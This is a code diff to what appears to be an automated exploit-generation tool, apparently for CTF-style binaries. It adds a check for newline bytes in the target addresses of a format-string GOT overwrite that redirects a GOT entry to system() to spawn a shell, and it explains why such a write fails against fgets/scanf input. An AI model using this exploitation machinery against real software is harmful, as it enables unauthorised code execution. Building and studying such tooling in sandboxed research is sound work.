@@ -851,6 +851,18 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
     return {"ok": False, "reason": "ORW chain did not disclose the flag", "base": None}
 
 
+def newline_write_targets(got_slot: int, nbytes: int = 6, word: int = 8) -> list:
+    """Write-target addresses (got_slot .. got_slot+nbytes-1) that carry a 0x0a (newline) byte.
+
+    A `%hhn` GOT overwrite plants `nbytes` of a libc address, one byte per consecutive target
+    address; each target is packed into the payload as a pointer. If any target has a 0x0a byte, a
+    line-delimited sink (fgets/scanf) truncates the payload at it and the write cannot be delivered
+    byte-for-byte -- a fundamental bad-byte constraint, not a payload-construction bug. Returned as
+    hex strings for a human-facing reason. Base-independent: the printf count fields are ASCII."""
+    return [hex(got_slot + i) for i in range(nbytes)
+            if 0x0A in struct.pack("<Q" if word == 8 else "<I", got_slot + i)]
+
+
 def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_off=None,
                      base_argv=(), timeout: float = 8.0, mem_mb: int = 2048,
                      marker: bytes = b"LYKOS-FMT-9931") -> dict:
@@ -872,6 +884,15 @@ def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_
     # byte; default to the overwrite target only as a fallback.
     lg = leak_got if leak_got is not None else got_slot
     lo = leak_off if leak_off is not None else system_off
+
+    # A newline byte ANYWHERE in the write payload truncates delivery to a line-reading sink
+    # (fgets/scanf stop at \n), after which the trailing %hhn directives index uninitialised stack
+    # and the child SIGSEGVs mid-write. The byte almost always comes from a write-TARGET address:
+    # overwriting printf@GOT writes bytes to got_slot+0..+5 (a 6-byte libc address), and one of
+    # those addresses can carry a 0x0a (e.g. got_slot 0x404008 -> 0x40400a). It is base-independent
+    # (the counts are ASCII, never 0x0a), so flag it up front -- so the failure is EXPLAINED, not a
+    # mystery crash. (A read()-based sink is unaffected -- read() does not stop at a newline.)
+    newline_targets = newline_write_targets(got_slot)
 
     for _ in range(3):
         preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
@@ -943,6 +964,13 @@ def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_
                 p.wait(timeout=2)
             except Exception:                                # noqa: BLE001
                 pass
+    if newline_targets:
+        return {"ok": False, "base": None,
+                "reason": ("format GOT->system could not be delivered: a write-target address "
+                           + ", ".join(newline_targets) + " contains a 0x0a (newline) byte, which a "
+                           "line-delimited sink (fgets/scanf) truncates -- the overwrite cannot be "
+                           "sent byte-for-byte. A read()-based sink would be unaffected; otherwise "
+                           "this GOT slot is not reachable by this technique.")}
     return {"ok": False, "reason": "format GOT->system did not spawn a shell", "base": None}
 
 
